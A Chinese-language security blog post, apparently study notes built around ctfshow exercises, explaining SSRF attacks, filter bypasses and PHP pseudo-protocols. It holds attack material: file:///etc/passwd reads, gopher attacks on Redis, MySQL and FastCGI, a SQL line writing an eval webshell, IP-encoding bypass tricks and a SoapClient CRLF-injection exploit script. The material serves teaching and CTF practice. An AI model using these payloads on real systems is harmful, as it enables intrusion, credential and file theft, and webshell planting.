---
title: ssrf漏洞的利用&伪协议
published: 2021-03-11 21:43
category: Web
draft: false
tags: [SSRF, 伪协议, Web安全]
---

# ssrf漏洞的利用&伪协议

## 0x1 SSRF原理解析

### 什么是ssrf

> SSRF (Server-Side Request Forgery,服务端请求伪造)是指攻击者向服务端发送包含恶意URL链接的请求，借由服务端去访问此URL，以获取受保户网络内的资源的种安全漏洞。SSRF 常被用于探测攻击者无法访问到的网络区域，比如服务器所在的内网，或是受防火墙访问限制的主机。

**一句话总结**ssrf:

控制服务器使用指定的协议(如http协议、file协议访问指定的url (如: file:iletc/passwd)

#### 思考:

访问如下url:

http//xxx.index.php?url=http://www.baidu.com

其中index php中的代码如下:

```php
<?php
$url = $_GET['url'];
header ("location:http://baidu.com");
?>
```

传递任意url地址给index php.就能跳转到指定的ur地址上，这个算不SSRF呢?

```
不算，这个是一个重定向，不是访问
```

#### 1 ssrf原理

SSRF(Server side Request Forgery.服务端请求伪造)是一种攻击 者通过构造数据进而伪造服务端发起请求的漏洞

因为请求是由内部发起的，所以一般情况下， ssrf漏洞攻击的目标主机是从外网无法直接访问的内部系统

SSRF流洞形成的原因多是服务端提供了从外部服务获取数据的功能I但没有对目标地址、协议等主要参数进行过滤和限制，从而导致攻击者可以自由构造参数，发起恶意请求

**与csrf的区别**

从服务器发起攻击

![](/images/posts/ssrf-pseudo-protocols/1.png)

从客户端开始攻击

![](/images/posts/ssrf-pseudo-protocols/2.png)

#### 2 url结构

```php
协议://username@passowrd@ip:port/?a=b
```

## 0x2 ssrf漏洞利用

### 2.0 利用理解

ssrf的利⽤，其实是利⽤通信协议对内部组件进⾏攻 击。ssrf漏洞的存在，帮我们构造了⼀个内部环境的代理agent，通过agent，我们可以对内部 环境进⾏窥探，当内部某个组件存在缺陷的时候，就可以攻击。

```php
https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
https://www.freebuf.com/vuls/262047.html
```

### 2.1 任意文件读取

```php
利用协议：
file:// 通用
ldap ，zlib phar tar rat //php
jar  //java
jar war tar
例如：url=file:///etc/passwd
```

通过ssrf对本地文件进行读取，用于代码审计或者配置文件读取，密码读取等。

### 2.2 内网资源探测

```php
url=file:///etc/hosts
url=file:///var/nginx/nginx.conf
```

#### 2.2.1 访问内部web

```php
url=http://
url=https://
```

这是最初级的ssrf利⽤了，通过ssrf去访问⼀个开启在127.0.0.1的web应⽤或者开放在内⽹的web应⽤。很可能开放在内⽹的服务没有进⾏⽐较强的鉴权，那么就可能有⼀些利用点。

另外常⻅的利⽤是，内⽹存在其他可以直接rce的web服务，可以先通过ssrf探测web指纹，来确 定是否存在特定应⽤。

当然也有⼀种利⽤⽅式是，直接对内⽹的web服务直接，盲打各种rce。

例如有的公司全靠vpn做隔离，一旦进入，就会受到很多攻击

#### 2.2.2 内网端口扫描

```php
任意协议，常规协议：http/https
```

这个与上⾯那个类似，利⽤的是⼀种差分攻击（差别分析攻击）。就是有⼀个简单的理论 基础“端⼝开放情况下与端⼝不开放情况下”，得到返回的时间会差别很⼤。以此，可以⽤来判断端⼝是否开启。

开放端口：错误了会马上返回

未开放端口：错误之后会缓一段时间

### 2.3 利用gopher协议展开攻击面&工具

#### 2.3.0 简介和工具

gopher协议的利⽤，可以看这⾥，主要了解他是怎么构成和封装的就可以了：

https://cloud.tencent.com/developer/article/2091368

https://www.cnblogs.com/h0cksr/p/16189737.html

https://www.bilibili.com/read/cv12733096

通过dict或者gopher协议去构造其他应⽤的通信协议，与其他应⽤通信。然后攻 击其他应⽤。 ⽬前国内⽹络上⽐较多的被⽤来搭配ssrf打的内部应⽤⼤致有：

攻击面有：

```php
https://blog.csdn.net/u012206617/article/details/108941738
https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/ssrf-vulnerable-platforms#fastcgi
```

**工具**

```
工具使用gopher那个
```

![](/images/posts/ssrf-pseudo-protocols/3.png)

#### 2.3.1 攻击redis的6397

```
数据库将内容以文件形式保存，文件中保存的是key和value的键值对，当在数据库中存储文本形式内容的时候，会以明文形式存储，如果存马，那在文件中就会有一句话木马。
redis也支持命令，第一个命令是修改配置命令，它可以修改到保存的数据库文件文件名，这时候，修改配置为一个PHP文件，那么进行数据保存的时候，会把数据库文件保存到指定的位置，就会生成一个PHP文件，虽然这个PHP文件里有其它的内容，但是只要内容中有PHP标签，就会执行PHP标签中的代码，从而实现代码执行。
使用条件：
1. redis没有密码
2. web目录可写，而且路径知道
```

redis一般运行在内网使用者一般将其绑定在6379端口，且一般为空密码

例题：web81

![](/images/posts/ssrf-pseudo-protocols/4.png)

![](/images/posts/ssrf-pseudo-protocols/5.png)

这才是完整的流量包

#### 2.2.2 攻击 mysql 的3306

```
不能有密码或者密码为空
一旦有密码，就是通过交互执行
如果没有密码，那就可以免交互
```

1. 需要密码验证，当需要进行密码验证的时候，客户端使用salt进行加密密码后再验证
2. 不需要密码认证，将直接使用上面第四种方式发送数据包

所以这里攻击mysql，需要在非交互环境下进行，一定只能攻击没有密码的mysql服务器

例题：web82

![](/images/posts/ssrf-pseudo-protocols/6.png)

```sql
select "<?php eval($_POST[1]);?> into outfile "/var/www/html/1.php"
```

#### 2.2.3 攻击攻击fastcgi的9000端口

> php-fpm是个中间件，在需要php解释器来处理.php文本时会用到php-fpm。自从php5.3.3以后，就将php-fpm集成在php内核中。PHP-FPM提供了更好的PHP进程管理方式。可以有效控制内存和进程，可以平滑的重载PHP配置

我们进程执行访问的**index.php?file=/etc/passwd**为例：

1. 浏览器发送访问index.php的请求到服务器，比如/nginx/apache
2. web服务器将请求的uri(index.php)，参数（file=/etc/passwd）等等发送给专门的PHP解释器来执行，因为nginx/apache是只能处理静态文件(通过文件读取的方式)，对于动态的PHP脚本，需要专门的PHP-fpm中间件来执行
3. php-fpm收到了web服务器传递过来的各种参数后，初始化zend虚拟机，对PHP文件做词法分析，语法分析，变异成opcode，并执行。最后关闭zend虚拟机，将执行结果返回给web服务器
4. web服务器收到返回结果后，将http响应传给浏览器

**fastcgi协议**：

> fastcgi是一个通信协议，和http协议一样，是一个进行数据交换的通道。http协议是浏览器和服务器红箭进行数据交换的协议，浏览器将http头和http体用某个规则组装成数据包，以TCP的方式发送到服务器的中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户的数据，在意HTTP协议的规则打包返回给服务器

```assembly
auto_prepend_file:在执行目标文件之前，先包含指定的文件，其可以使用的协议：php://input,
auto_append_file:在执行目标文件之后，包含指定的文件
9000端口攻击：
在攻击9000端口时，因为php-fpm支持通过param参数形式设置php.ini的值，所以给auto_append_file值设置为php://input读取，通过直接将PHP代码直接附加到流量尾部，通过php://input实现读取，在访问某个PHP文件时，会自动包含进去，如果有恶意代码，便会执行
```

![](/images/posts/ssrf-pseudo-protocols/7.png)

**简单来说就是**

```
1. redis是用来写文件shell的，如果目录不可写就没办法执行木马
2. 3306是打mysql，必须没有密码，而且知道没有密码对应的用户名
	同时，mysql对web目录有写权限
3. 两者都需要对数据进行二次编码
4. 打9000时，因为php-fpm支持通过param参数形式这是php.ini的值
所以我们给auto_append_file值设置为php://input
然后通过直接将php代码附加到流量尾部，实现php://input读取
读取以后，在外面访问某个php文件时，会自动包含进去
里面如果有恶意的php代码，就会执行
```

#### 2.2.4 php 原生类利用

利用反序列化和原生类配合，打ssrf请求

常用类为SoapClient类，就下面那个绕过方式

## 0x3 ssrf的绕过

### 3.1 使用enclosed alphanumerics绕过数字限制

```assembly
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ >>> http://example.com
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```

### 3.2 ip地址进制绕过

https://tool.520101.com/wangluo/jinzhizhuanhuan/

ip 转10进制：2130706433

ip 转16进制：0x7F000001

### 3.3 特殊写法绕过

```
0:0.0.0.0
127.1:127.0.0.1
127。0。0。1
```

### 3.4 短网址绕过

短网址绕过：直接写http://url/

https://www.dwz.lc/

### 3.5 @绕过

```
www.baidu.com@vps
访问的是vps
```

### 3.6 利用soap实现ssrf(CLRF)

当调用soapClient的一个未知方法时，会调用它的构造方法

```php
flag.php
<?php
$flag = "ctfshow{i_am_flag}";
$host= $_SERVER['HTTP_X_FORWARDED_FOR'];

if($host !=="127.0.0.1"){
    die("仅限内网访问");
}
$name = $_POST['name'];
if($name){
    echo $name;
    echo $flag;
    system("calc");
}
```

```php
exp.php
<?php
$url = "http://127.0.0.1/flag.php";

$post = "name=admin";

$enter = chr(0x0d).chr(0x0a);

//,'user-agent'=>"ctfshow%0d%0aCookie:login=1"

$payload = "ctfshow[ctfshow]X-Forwarded-For:127.0.0.1[ctfshow]Content-Type:application/x-www-form-urlencoded[ctfshow]Content-Length:".strlen($post)."[ctfshow][ctfshow]name=admin[ctfshow][ctfshow]";

$payload = str_replace('[ctfshow]',$enter,$payload);

$object = new SoapClient(null,array('location'=>$url,'user_agent'=>$payload,'uri'=>''));

$object->ctfshow();
```

### 3.7 更多绕过

```
https://www.secpulse.com/archives/65832.html
https://xz.aliyun.com/t/2115
```

## 0x4 协议和伪协议

### 4.1 协议

> 计算机场景下的协议常常指的是通信协议（⽹络协议）。⽹络协议是通信计算机双⽅必须 共同遵从的⼀组约定。如怎么样建⽴连接、怎么样互相识别等。只有遵守这个约定，计算机之 间才能相互通信交流。
>
> 简单来说：大家都支持的协议：http:// https:// 百度网盘协议 腾讯会议协议等

### 4.2 伪协议

> 伪协议其实算是⼀个虚概念，就是并不是所有语⾔、所有产品共⽤的。往往是某个语⾔或 者某个程序⾃身，为了解决⾃身内部的通信需求，⾃⾏编制的⼀个协议。
>
> 简单来说，就是例如php://filter这个协议，大家都知道，但是这个协议只有PHP这个语言支持，放在python，java这个协议就不支持了。这种就是伪协议，又由于它是PHP支持的，所以叫PHP伪协议。当然如果是仅python支持的协议，那就可以叫python伪协议(只是举个例子，有没有俺也不知道)

### 4.3 PHP伪协议

【伪协议官方手册】https://www.php.net/manual/zh/wrappers.php

PHP 带有很多内置 URL ⻛格的封装协议，可⽤于类似 fopen()、 copy()、 file_exists() 和 filesize() 的⽂件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册 ⾃定义的封装协议(但个人能力有限，复现了亿会儿实在没搞出来，虽然有的出结果了，但是感觉没太大意义，还是说是支持伪协议，如果需要执行，还是得用include等)

```php
file:// — 访问本地文件系统
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — 安全外壳协议 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
要了解某个软件组件的特性，最好看官方文档	
```

利用：

```
https://blog.csdn.net/cosmoslin/article/details/120695429
https://view.inews.qq.com/a/20220602A000IS00
https://www.jianshu.com/p/8f1576b72420
https://www.bbsmax.com/A/B0zqrjpNJv/
```

### 4.4 php伪协议利用代码通解

```
跟踪输入点
输入点进入到文件系统操作函数，readfile(),file(),file_get_contents()这种
能够控制参数的开头
```

```php
<?php 
$input = $_GET['file'];
file_get_contents($input."yu"); // 开干,需要其他的绕过
file_get_contents("yu".$input); // 开摆
?>
```

一般来说，正常是会有拼接的

### 4.5 curl支持ssrf协议

![](/images/posts/ssrf-pseudo-protocols/8.png)

curl支持28种协议，并且curl在不同的语言都有插件或者是扩展。所以，加入遇到了通过curl执行的ssrf漏洞，那么可以执行其他的协议

gopher协议：用来包含其他协议

用例，curl读取文件

```php
<?php
function curl($url){ 
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_exec($ch);
    curl_close($ch);
}
$url = $_GET['url'];
curl($url);
?>
```

![](/images/posts/ssrf-pseudo-protocols/9.png)

## 0x5 其它

### 报错

探测代码中的函数支持哪些函数，可以输入一个错误的协议，然后跟进报错，看代码支持

例如urllib模块支持如下协议

![](/images/posts/ssrf-pseudo-protocols/10.png)

requests模块支持http,https

![](/images/posts/ssrf-pseudo-protocols/11.png)

### data协议利用

【Data URL - HTTP | MDN (mozilla.org)】https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Data_URLs

### 历史ssrf的cve

```assembly
https://github.com/smarx/hashcache-ctf
https://smarx.com/posts/2020/09/ssrf-to-redis-ctf-solution/
https://bugs.python.org/issue36276
```